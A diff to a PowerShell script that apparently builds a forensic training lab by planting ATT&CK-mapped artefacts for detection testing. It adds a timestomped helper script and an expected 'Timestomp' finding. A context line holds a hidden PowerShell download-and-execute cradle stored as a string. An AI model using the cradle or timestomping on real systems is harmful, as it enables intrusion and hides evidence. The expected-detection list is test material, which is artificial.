@@ -59,6 +59,13 @@ $note = "powershell -nop -w hidden -ep bypass -c IEX (New-Object Net.WebClient).
 Write-Output "lab sync ok"
 '@ | Set-Content -Path "$lab\sync.ps1" -Encoding UTF8
 
+# T1070.006: timestomped script. Setting the times changes $STANDARD_INFORMATION only,
+# so its creation time lands years before the $FILE_NAME one.
+"Write-Output rivendell-lab" | Set-Content -Path "$lab\helper.ps1"
+$stomp = Get-Date "2019-03-14 09:26:53"
+(Get-Item "$lab\helper.ps1").CreationTime = $stomp
+(Get-Item "$lab\helper.ps1").LastWriteTime = $stomp
+
 # T1547.001: Run key persistence (the command only echoes).
 $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output rivendell-lab"))
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "LabUpdater" `
@@ -103,6 +110,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
     {"artefact": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LabUpdater", "attack": "T1547.001", "yara": ["Persistence_Registry_Keys"]},
     {"artefact": "Scheduled task LabSync", "attack": "T1053.005"},
     {"artefact": "C:\\ProgramData\\RivendellLab\\sync.ps1", "attack": "T1059.001", "yara": ["Suspicious_PowerShell_Command", "Suspicious_Network_Activity"]},
+    {"artefact": "C:\\ProgramData\\RivendellLab\\helper.ps1", "attack": "T1070.006", "expect": ["Timestomp"]},
     {"artefact": "C:\\Users\\Public\\Documents\\notes.txt", "attack": "T1003.001", "yara": ["Potential_Credential_Access"]},
     {"artefact": "Service LabHelper", "attack": "T1543.003"},
     {"artefact": "Security 4625 x10 (labattacker)", "attack": "T1110.001"},
